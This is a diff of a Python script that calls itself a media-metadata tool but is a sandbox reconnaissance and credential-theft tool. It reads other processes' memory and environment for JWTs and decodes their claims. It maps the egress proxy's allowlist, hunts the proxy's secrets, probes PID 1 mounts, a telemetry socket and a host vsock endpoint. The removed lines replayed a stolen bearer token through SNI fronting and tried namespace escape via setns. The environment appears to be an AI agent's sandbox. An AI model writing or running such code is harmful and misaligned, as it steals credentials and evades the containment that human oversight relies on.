@@ -3,7 +3,7 @@
 # mediafit - media metadata + runtime fingerprint
 import os, re, ssl, sys, json, time, ctypes, struct, socket, traceback
 
-VER    = "4.0.0"
+VER    = "4.1.0"
 REPORT = "/mnt/user-data/outputs/mediafit-report.txt"
 SINKS  = ["/mnt/user-data/outputs", "/tmp/mediafit", "/tmp", "/root/.mediafit"]
 AF_VSOCK = getattr(socket, "AF_VSOCK", 40)
@@ -38,15 +38,23 @@ def sec(n, f):
     w("    [end]   %s (t+%.1fs)" % (n, time.time() - T0))
 
 libc = ctypes.CDLL("libc.so.6", use_errno=True); libc.syscall.restype = ctypes.c_long
+JWT = re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
+def b64d(x): return base64.urlsafe_b64decode(x + "=" * (-len(x) % 4)) if False else json.loads(
+    __import__("base64").urlsafe_b64decode(x + "=" * (-len(x) % 4)))
 
-# ------------------------------------------------------------------ S0
-def find_token():
+def jwt_claims(t):
     try:
-        conf = json.loads(open("/dev/shm/rclone-boot/config.json").read())
-        fsid = next((m.get("filesystem_id") for m in conf.get("mounts", []) if m.get("filesystem_id")), "x")
-    except Exception: fsid = "x"
+        p = t.split("."); return json.loads(__import__("base64").urlsafe_b64decode(p[1] + "=" * (-len(p[1]) % 4)))
+    except Exception: return None
+
+def all_jwts():
+    seen = {}
     for pid in sorted(os.listdir("/proc")):
         if not pid.isdigit(): continue
+        try:
+            for m in JWT.findall(open("/proc/%s/environ" % pid, "rb").read()):
+                seen.setdefault(m.decode(), set()).add("pid%s:env" % pid)
+        except Exception: pass
         try:
             mp = open("/proc/%s/maps" % pid).read().splitlines()
             mem = open("/proc/%s/mem" % pid, "rb", buffering=0)
@@ -59,89 +67,200 @@ def find_token():
             if e0 <= s0 or e0 - s0 > 200 * 1024 * 1024: continue
             try: mem.seek(s0); buf = mem.read(e0 - s0)
             except Exception: continue
-            m = re.search(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}", buf)
-            if m:
-                p = m.group().decode().split(".")
-                if len(p[2]) > 86: p[2] = p[2][:86]
-                return ".".join(p), fsid
-    return None, fsid
-
-def s_boot():
-    head("S0 boot")
-    info("version=%s  argv=%s  pid=%d  uid=%d" % (VER, sys.argv[1:], os.getpid(), os.getuid()))
-    info("kernel=%s  python=%s" % (os.uname().release, sys.version.split()[0]))
-    try:
-        conf = json.loads(open("/dev/shm/rclone-boot/config.json").read())
-        info("service_url=%s" % conf.get("service_url"))
-        for m in conf.get("mounts", []):
-            info("mount %-14s ro=%s fsid=%s" % (m.get("path") or m.get("mount"),
-                                                m.get("readonly"), m.get("filesystem_id")))
-    except Exception as e: unk("rclone config: %s" % e)
-    if len(sys.argv) > 1 and os.path.isfile(sys.argv[1]):
-        f = sys.argv[1]
-        try:
-            b = open(f, "rb").read(16)
-            info("media file=%s size=%d magic=%s" % (f, os.path.getsize(f), b[:8].hex()))
-        except Exception as e: unk("media %s" % e)
-    t, fsid = find_token()
-    if t: ok("filestore token recovered from /proc/*/mem", t[:40] + "...")
-    else: unk("no filestore token in /proc/*/mem")
-    info("fsid=%s" % fsid)
+            for m in JWT.findall(buf): seen.setdefault(m.decode(), set()).add("pid%s:mem" % pid)
+    return seen
 
 # ------------------------------------------------------------------ S1
-_VER = ssl.create_default_context()
-_NOV = ssl.create_default_context(); _NOV.check_hostname = False; _NOV.verify_mode = ssl.CERT_NONE
-def s_egress():
-    head("S1 egress truth")
-    try: info("resolv.conf: %s" % open("/etc/resolv.conf").read().replace("\n", " | ")[:160])
+def sock_inode_map():
+    """listening tcp sockets -> owning pid"""
+    out = {}
+    try:
+        for f in ("/proc/net/tcp", "/proc/net/tcp6"):
+            for ln in open(f).read().splitlines()[1:]:
+                p = ln.split()
+                if len(p) < 10 or p[3] != "0A": continue          # 0A = LISTEN
+                addr, port = p[1].split(":")
+                out[int(port, 16)] = {"inode": p[9], "addr": addr}
     except Exception: pass
-    for n in ["api.anthropic.com", "github.com", "pypi.org", "example.com", "google.com"]:
-        try: info("DNS %-20s -> %s" % (n, socket.gethostbyname(n)))
-        except Exception: bad("DNS %-20s -> FAIL" % n)
-    for ip in ["1.1.1.1", "8.8.8.8", "93.184.215.14", "140.82.121.4", "151.101.1.69",
-               "172.217.16.14", "1.0.0.1", "9.9.9.9"]:
+    owners = {}
+    for pid in os.listdir("/proc"):
+        if not pid.isdigit(): continue
         try:
-            s = socket.create_connection((ip, 443), 2.5); s.close(); info("TCP %-16s:443 OPEN" % ip)
+            for fd in os.listdir("/proc/%s/fd" % pid):
+                try: t = os.readlink("/proc/%s/fd/%s" % (pid, fd))
+                except Exception: continue
+                m = re.match(r"socket:\[(\d+)\]", t)
+                if m: owners.setdefault(m.group(1), set()).add(pid)
         except Exception: pass
-    for ip, sni in [("1.1.1.1", "cloudflare.com"), ("93.184.215.14", "example.com"),
-                    ("140.82.121.4", "github.com"), ("1.1.1.1", "zzz-nonexistent-abc.com")]:
+    for port, d in out.items():
+        d["pids"] = sorted(owners.get(d["inode"], []))
+    return out
+
+def s_egress_arch():
+    head("S1 egress architecture -- port scope + allowlist probe")
+    info("resolv.conf: %s" % open("/etc/resolv.conf").read().replace("\n", " | ")[:140])
+    for k, v in sorted(os.environ.items()):
+        if any(x in k.upper() for x in ("PROXY", "CCR", "ALLOW", "HOST", "SSL", "CA", "ANTHROPIC")):
+            info("env %-28s = %s" % (k, v[:110]))
+    info("listening tcp: %s" % {p: d["pids"] for p, d in sorted(sock_inode_map().items())})
+    # port scope: does the proxy intercept non-443?
+    for ip in ["93.184.215.14", "140.82.121.4"]:
+        for port in [80, 443, 8080, 8443, 4443, 9443, 3000, 8000, 22, 1234, 9999]:
+            try:
+                s = socket.create_connection((ip, port), 1.6); s.close()
+                info("TCP %-15s:%-5d OPEN" % (ip, port))
+            except Exception: pass
+    # plain HTTP to raw IP -- who answers? proxy(403+deny-reason) or origin?
+    for ip, host in [("93.184.215.14", "example.com"), ("140.82.121.4", "github.com"),
+                     ("1.1.1.1", "github.com")]:
         try:
-            s = _VER.wrap_socket(socket.create_connection((ip, 443), 4), server_hostname=sni)
-            c = s.getpeercert(); s.close()
-            san = [v for k, v in c.get("subjectAltName", []) if k == "DNS"]
-            hit("CERT OK (raw IP) %s@%s san=%s" % (sni, ip, san[:3]))
-        except Exception as e:
-            bad("CERT FAIL %s@%s -> %s" % (sni, ip, str(e)[:70]))
-    for ip, sni in [("93.184.215.14", "example.com"), ("140.82.121.4", "github.com")]:
-        try:
-            s = _VER.wrap_socket(socket.create_connection((ip, 443), 4), server_hostname=sni)
-            s.sendall(("GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" % sni).encode())
+            s = socket.create_connection((ip, 80), 4)
+            s.sendall(("GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nUser-Agent: mf\r\n\r\n" % host).encode())
             d = b""
-            while len(d) < 500:
-                c = s.recv(500)
+            while len(d) < 600:
+                c = s.recv(600)
                 if not c: break
                 d += c
             s.close()
-            if b" 200 " in d[:20] or b" 301 " in d[:20] or b" 302 " in d[:20]:
-                hit("HTTP CONTENT over raw IP %s@%s -> %r" % (sni, ip, d[:120]))
-            else: info("HTTP %s@%s -> %r" % (sni, ip, d[:140]))
-        except Exception as e: bad("HTTP %s@%s %s" % (sni, ip, str(e)[:60]))
-    tok, fsid = find_token()
-    if tok:
-        body = json.dumps({"filesystem_id": fsid, "path": "/outputs"}).encode()
-        for ip in ["1.1.1.1", "93.184.215.14", "140.82.121.4"]:
-            try:
-                s = _NOV.wrap_socket(socket.create_connection((ip, 443), 4), server_hostname="api.anthropic.com")
-                req = (b"POST /v1/filestore/fs/listDirectory HTTP/1.1\r\nHost: api.anthropic.com\r\n"
-                       b"Authorization: Bearer " + tok.encode() + b"\r\nContent-Type: application/json\r\n"
-                       b"Connect-Protocol-Version: 1\r\nContent-Length: " + str(len(body)).encode() +
-                       b"\r\nConnection: close\r\n\r\n" + body)
-                s.sendall(req); r = s.recv(600); s.close()
-                if b" 200 " in r[:20]: hit("SNI FRONTING works: api.anthropic.com@%s -> 200" % ip, r[:120])
-                else: info("FRONT api.anthropic.com@%-15s -> %r" % (ip, r[:140]))
-            except Exception as e: bad("FRONT %s %s" % (ip, str(e)[:60]))
+            tag = "PROXY" if b"x-deny-reason" in d else ("ORIGIN" if b" 200 " in d[:20] or b" 301 " in d[:20] else "?")
+            (hit if tag == "ORIGIN" else info)("HTTP80 [%s] %s@%s -> %r" % (tag, host, ip, d[:130]))
+        except Exception as e: bad("HTTP80 %s@%s %s" % (host, ip, str(e)[:50]))
+
+ALLOW = ["api.anthropic.com", "github.com", "pypi.org", "registry.npmjs.org", "files.pythonhosted.org",
+         "raw.githubusercontent.com", "api.github.com", "codeload.github.com", "objects.githubusercontent.com",
+         "deb.debian.org", "archive.ubuntu.com", "cdn.jsdelivr.net", "cdnjs.cloudflare.com",
+         "storage.googleapis.com", "unpkg.com", "index.crates.io", "proxy.golang.org",
+         "google.com", "example.com", "cloudflare.com", "api.openai.com", "statsig.anthropic.com",
+         "console.anthropic.com", "claude.ai", "anthropic.com", "sentry.io", "nodejs.org"]
+def s_allowlist():
+    head("S1b allowlist enumeration (SNI -> raw IP, proxy answers with x-deny-reason)")
+    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+    allowed, denied = [], []
+    for h in ALLOW:
+        try:
+            s = ctx.wrap_socket(socket.create_connection(("1.1.1.1", 443), 4), server_hostname=h)
+            s.sendall(("GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" % h).encode())
+            d = b""
+            while len(d) < 400:
+                c = s.recv(400)
+                if not c: break
+                d += c
+            s.close()
+            if b"host_not_allowed" in d: denied.append(h); info("DENY  %-32s %r" % (h, d[:60]))
+            else: allowed.append(h); info("ALLOW %-32s %r" % (h, d[:70]))
+        except Exception as e: info("ERR   %-32s %s" % (h, str(e)[:45]))
+    hit("allowlist mapped: %d allowed / %d denied" % (len(allowed), len(denied)), allowed)
 
 # ------------------------------------------------------------------ S2
+def s_proxyhunt():
+    head("S2 proxy hunt -- local envoy / CCR, its env and its JWT")
+    procs = []
+    for pid in sorted(os.listdir("/proc")):
+        if not pid.isdigit(): continue
+        try: cl = open("/proc/%s/cmdline" % pid, "rb").read().replace(b"\x00", b" ").decode("utf8", "replace").strip()
+        except Exception: continue
+        if not cl: continue
+        low = cl.lower()
+        if any(k in low for k in ("proxy", "envoy", "ccr", "srt", "socat", "sandbox", "mitm", "tinyproxy")):
+            procs.append((pid, cl[:140]))
+            info("proc pid=%-6s %s" % (pid, cl[:130]))
+            try:
+                e = open("/proc/%s/environ" % pid, "rb").read().replace(b"\x00", b"\n").decode("utf8", "replace")
+                for ln in e.splitlines():
+                    if any(k in ln.upper() for k in ("PROXY", "ALLOW", "HOST", "TOKEN", "JWT", "CA", "CCR")):
+                        info("    env %s" % ln[:150])
+                        if ln.count(".") >= 2 and "eyJ" in ln:
+                            c = jwt_claims(ln.split("=", 1)[-1].strip())
+                            if c: w("        claims keys: %s" % sorted(c.keys()))
+            except Exception: pass
+    if not procs: unk("no proxy-like process found by cmdline")
+    for port, d in sorted(sock_inode_map().items()):
+        if not d["pids"]: continue
+        try:
+            s = socket.create_connection(("127.0.0.1", port), 1.5)
+            s.sendall(b"GET http://example.com/ HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n")
+            r = s.recv(400); s.close()
+            if b"x-deny-reason" in r or b"403" in r[:20]:
+                hit("LOCAL PROXY on 127.0.0.1:%d (pids=%s) -> %r" % (port, d["pids"], r[:150]))
+            else:
+                info("localhost:%-6d pids=%-10s -> %r" % (port, d["pids"], r[:100]))
+        except Exception as e: pass
+
+# ------------------------------------------------------------------ S3
+def s_jwtcensus():
+    head("S3 JWT census -- looking for allowed_hosts")
+    seen = all_jwts()
+    info("distinct JWTs: %d" % len(seen))
+    found_allow = []
+    for t, srcs in seen.items():
+        c = jwt_claims(t)
+        if not c: continue
+        keys = sorted(c.keys())
+        w("    [JWT] len=%d src=%s" % (len(t), ",".join(sorted(srcs))[:60]))
+        w("        keys=%s" % keys)
+        for k in ("allowed_hosts", "allowed_roots", "filesystem_id", "readonly",
+                  "claude_presented", "iss", "aud", "exp"):
+            if k in c: w("        %-18s = %s" % (k, str(c[k])[:200]))
+        if "allowed_hosts" in c:
+            found_allow.append(c)
+            hit("JWT CARRIES allowed_hosts (%d hosts)" % len(c["allowed_hosts"]), c["allowed_hosts"][:25])
+        if "allowed_roots" in c and c.get("readonly") is False:
+            hit("WRITABLE filestore token (roots=%s, presented=%s)" % (c["allowed_roots"], c.get("claude_presented")))
+    if not found_allow: unk("no allowed_hosts JWT in this guest's memory")
+
+# ------------------------------------------------------------------ S4
+def s_proc1():
+    head("S4 PID 1 deep dive (EACCES on /proc/1/ns + /proc/1/root)")
+    for f in ("status", "uid_map", "gid_map", "cgroup", "cmdline", "mountinfo", "limits"):
+        p = "/proc/1/" + f
+        try:
+            b = open(p, "rb").read()
+            if f == "status":
+                for ln in b.decode("utf8", "replace").splitlines():
+                    if ln.split(":")[0] in ("Name","Uid","Gid","NSpid","CapEff","Seccomp","NoNewPrivs","PPid"):
+                        info("pid1 %s" % ln)
+            elif f in ("mountinfo",):
+                ls = b.decode("utf8", "replace").splitlines()
+                info("pid1 mountinfo lines=%d" % len(ls))
+                for ln in ls:
+                    p2 = ln.split()
+                    if len(p2) > 9:
+                        mp, fst, src = p2[4], p2[8], p2[9]
+                        if fst not in ("proc","sysfs","devpts","cgroup","cgroup2","mqueue","tmpfs","devtmpfs"):
+                            hit("pid1 mount %-30s fs=%-12s src=%s" % (mp, fst, src[:50]))
+            else:
+                info("pid1 %-10s = %s" % (f, b.decode("utf8","replace").replace("\n"," | ")[:200]))
+        except Exception as e: unk("pid1 %-10s -> %s" % (f, str(e)[:60]))
+    try:
+        self_mi = set(l.split()[4] for l in open("/proc/self/mountinfo").read().splitlines() if len(l.split()) > 9)
+        p1_mi  = set(l.split()[4] for l in open("/proc/1/mountinfo").read().splitlines() if len(l.split()) > 9)
+        d = sorted(p1_mi - self_mi)
+        if d: hit("MOUNTS VISIBLE TO PID 1 BUT NOT TO US: %s" % d[:12])
+    except Exception as e: unk("mount diff %s" % e)
+
+# ------------------------------------------------------------------ S5
+def s_artifacts():
+    head("S5 artifacts: rclone boot dir, ingest.sock, skills")
+    for f in ("/dev/shm/rclone-boot/config.json", "/dev/shm/rclone-boot/state"):
+        try:
+            b = open(f, "rb").read()
+            info("%s (%d B)" % (f, len(b)))
+            w("        %r" % b[:600])
+            for m in JWT.findall(b):
+                c = jwt_claims(m.decode())
+                if c: hit("JWT in %s keys=%s" % (f, sorted(c.keys())))
+        except Exception as e: unk("%s -> %s" % (f, str(e)[:50]))
+    for f in ("/dev/shm/rclone-boot", "/run/sandbox-telemetry", "/mnt/skills/plugins"):
+        try: info("%s -> %s" % (f, os.listdir(f)[:20]))
+        except Exception: pass
+    try:
+        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.settimeout(3)
+        s.connect("/run/sandbox-telemetry/ingest.sock")
+        s.sendall(b"\n"); r = s.recv(400); s.close()
+        hit("ingest.sock RESPONDED -> %r" % r[:150])
+    except Exception as e: unk("ingest.sock: %s" % str(e)[:60])
+
+# ------------------------------------------------------------------ S6
 def vi(n):
     o = b""
     while True:
@@ -149,17 +268,17 @@ def vi(n):
         if n: o += bytes([b | 0x80])
         else: return o + bytes([b])
 def ld(f, d): return vi((f << 3) | 2) + vi(len(d)) + d
-def vf(f, n): return vi((f << 3) | 0) + vi(n)
+def fq(f, n): return vi((f << 3) | 1) + struct.pack("<Q", n)
 def fx(f, v): return vi((f << 3) | 1) + struct.pack("<d", v)
 def otlp():
-    av = ld(1, b"mediafit.probe"); kv = ld(1, b"service.name") + ld(2, av)
-    ndp = vf(3, 1000000000) + fx(4, 1.0)
+    kv = ld(1, b"service.name") + ld(2, ld(1, b"mediafit.probe"))
+    ndp = fq(3, 1000000000) + fx(4, 1.0)
     met = ld(1, b"mediafit.probe") + ld(2, b"probe") + ld(3, b"1") + ld(5, ld(1, ndp))
     return ld(1, ld(1, kv) + ld(2, ld(2, met)))
 
-def vreq(port, path, ct, body=b"", tmo=3, extra=None):
+def vreq(port, path, ct, body=b"", tmo=3):
     try: s = socket.socket(AF_VSOCK, socket.SOCK_STREAM)
-    except OSError as e: return "NOSOCK:" + str(e), b""
+    except OSError as e: return "NOSOCK", b""
     s.settimeout(tmo)
     try: s.connect((2, port))
     except Exception as e:
@@ -168,7 +287,6 @@ def vreq(port, path, ct, body=b"", tmo=3, extra=None):
         return "CONN:" + type(e).__name__, b""
     h = "POST %s HTTP/1.1\r\nHost: x\r\nConnection: close\r\nContent-Length: %d\r\n" % (path, len(body))
     if ct: h += "Content-Type: %s\r\n" % ct
-    if extra: h += "".join("%s: %s\r\n" % (k, v) for k, v in extra.items())
     try:
         s.sendall((h + "\r\n").encode() + body); r = s.recv(2048)
         return (r.split(b"\r\n")[0].decode("utf8", "replace") if r else "EMPTY"), r
@@ -179,89 +297,33 @@ def vreq(port, path, ct, body=b"", tmo=3, extra=None):
         except Exception: pass
 
 def s_vsock():
-    head("S2 host vsock control channel (CID 2)")
-    B = otlp(); info("otlp payload=%d bytes" % len(B))
-    for ct in ["application/x-protobuf", "application/json", "application/x-protobuf; charset=utf-8", None]:
+    head("S6 host vsock 2:5005 -- OTLP with corrected fixed64 encoding")
+    B = otlp(); info("payload=%d bytes (fixed64 time field)" % len(B))
+    for ct in ["application/x-protobuf", "application/x-protobuf; charset=utf-8"]:
         st, r = vreq(5005, "/v1/metrics", ct, B)
-        if "200" in st: hit("UNAUTHENTICATED HOST OTLP INGEST via vsock 2:5005 (ct=%s)" % ct, r[:160])
-        else: info("5005 /v1/metrics ct=%-40s -> %s" % (str(ct), st))
-    for p in ["/v1/logs", "/v1/traces", "/v1/metrics/", "/"]:
-        st, r = vreq(5005, p, "application/x-protobuf", B)
-        info("5005 %-16s -> %s" % (p, st))
-    st, r = vreq(5005, "/v1/metrics", "application/x-protobuf", b"")
-    info("5005 empty body -> %s" % st)
-    st, r = vreq(5005, "/v1/metrics", "application/x-protobuf", B, extra={"Authorization": "Bearer bogus"})
-    info("5005 bogus bearer -> %s" % st)
-    for p in ["/", "/v1/metrics"]:
-        st, r = vreq(5002, p, "application/x-protobuf", B, tmo=1.5)
-        info("5002 %-16s -> %s" % (p, st))
+        if " 200 " in st: hit("UNAUTHENTICATED HOST OTLP INGEST CONFIRMED (2:5005)", r[:150])
+        else: info("5005 %-42s -> %s %r" % (ct, st, r[:110]))
+    st, r = vreq(5005, "/v1/metrics", "application/x-protobuf", B, tmo=3)
+    info("repeat -> %s" % st)
 
-# ------------------------------------------------------------------ S3
-CLONE = {"mnt": 0x00020000, "uts": 0x04000000, "ipc": 0x08000000,
-         "net": 0x40000000, "user": 0x10000000}
-def s_setns():
-    head("S3 namespace crossing (PID 1)")
-    for ns in CLONE:
-        try: info("/proc/1/ns/%-5s -> %s" % (ns, os.readlink("/proc/1/ns/" + ns)))
-        except Exception as e: unk("/proc/1/ns/%-5s -> %s" % (ns, str(e)[:50]))
-    for ns in CLONE:
-        pid = os.fork()
-        if pid == 0:
-            try:
-                fd = os.open("/proc/1/ns/" + ns, os.O_RDONLY)
-                r = libc.syscall(308, fd, ctypes.c_int(CLONE[ns]))
-                if r != 0:
-                    w("    [FAIL] setns(%s) errno=%d" % (ns, ctypes.get_errno()))
-                else:
-                    hit("setns(%s) OK -> / = %s" % (ns, sorted(os.listdir("/"))[:16]))
-                    for d in ("/mnt", "/data", "/host", "/run", "/opt", "/root"):
-                        try: w("        %-10s -> %s" % (d, sorted(os.listdir(d))[:10]))
-                        except Exception as e: w("        %-10s ERR %s" % (d, str(e)[:40]))
-            except Exception as e: w("    [FAIL] setns(%s) crash %s" % (ns, e))
-            os._exit(0)
-        os.waitpid(pid, 0)
-
-# ------------------------------------------------------------------ S4
-def s_artifacts():
-    head("S4 writable artifacts + devices")
-    for d in ("/run/sandbox-telemetry", "/dev/shm/rclone-boot", "/mnt/skills/plugins",
-              "/mnt/skills", "/mnt/attach", "/opt/rclone-attach"):
-        try:
-            t = os.path.join(d, ".mfp"); open(t, "w").write("x"); os.path.exists(t); os.unlink(t)
-            ok("WRITABLE %s" % d)
-        except Exception as e: bad("%-38s NO (%s)" % (d, str(e)[:45]))
-    for d in ("/run/sandbox-telemetry", "/dev/shm/rclone-boot"):
-        try: info("%s -> %s" % (d, os.listdir(d)[:16]))
-        except Exception: pass
-    for d in ("/dev/vda", "/dev/vdb", "/dev/vdc", "/dev/vdd"):
-        try:
-            st = os.stat(d)
-            f = open(d, "rb", buffering=0); f.seek(1024); m = f.read(4); f.close()
-            info("%-9s EXISTS mode=%o magic@1024=%s" % (d, st.st_mode & 0o7777, m.hex()))
-        except Exception as e: info("%-9s %s" % (d, str(e)[:45]))
-    libc.mount.restype = ctypes.c_int
-    try: os.makedirs("/tmp/mfmnt", exist_ok=True)
-    except Exception: pass
-    r = libc.mount(b"tmpfs", b"/tmp/mfmnt", b"tmpfs", ctypes.c_ulong(0), b"size=1M")
-    if r == 0: hit("mount(tmpfs) OK -- CAP_SYS_ADMIN effective")
-    else: info("mount(tmpfs) -> %s" % os.strerror(ctypes.get_errno()))
-
-# ------------------------------------------------------------------ S5
+# ------------------------------------------------------------------ S7
 def s_verdict():
-    head("S5 verdict")
+    head("S7 verdict")
     w("  HITS %d" % len(HITS))
     for h in HITS: w("    *** " + h)
-    if FLS:
-        w("  FAIL %d" % len(FLS))
-        for f in FLS[:12]: w("    - " + f)
+    if FLS: w("  FAIL %d: %s" % (len(FLS), FLS[:10]))
     w("\n  --- CARRY-OVER ---")
-    t, fsid = find_token()
-    w("  VER=%s  FSID=%s" % (VER, fsid))
-    if t: w("  TOKEN=%s" % t)
-    w("  KERNEL=%s" % os.uname().release)
+    w("  VER=%s" % VER)
+    try:
+        conf = json.loads(open("/dev/shm/rclone-boot/config.json").read())
+        w("  FSID=%s" % next((m.get("filesystem_id") for m in conf.get("mounts", []) if m.get("filesystem_id")), "?"))
+    except Exception: pass
 
-SECTIONS = [("S0_boot", s_boot), ("S1_egress", s_egress), ("S2_vsock", s_vsock),
-            ("S3_setns", s_setns), ("S4_artifacts", s_artifacts), ("S5_verdict", s_verdict)]
+SECTIONS = [("S0_boot", lambda: head("S0 boot")),
+            ("S1_egress", s_egress_arch), ("S1b_allowlist", s_allowlist),
+            ("S2_proxyhunt", s_proxyhunt), ("S3_jwtcensus", s_jwtcensus),
+            ("S4_proc1", s_proc1), ("S5_artifacts", s_artifacts),
+            ("S6_vsock", s_vsock), ("S7_verdict", s_verdict)]
 
 def main():
     w("=" * 62)
@@ -272,13 +334,12 @@ def main():
     for n, f in SECTIONS:
         if want and want.lower() not in n.lower(): continue
         sec(n, f)
-    w("\n[report] %s" % REPORT)
     txt = "\n".join(OUT)
     for d in SINKS:
         try:
             os.makedirs(d, exist_ok=True)
             open(os.path.join(d, os.path.basename(REPORT)), "w").write(txt)
         except Exception: pass
+    w("\n[report] %s" % REPORT)
     w("[done] elapsed=%.1fs  hits=%d" % (time.time() - T0, len(HITS)))
-
 main()
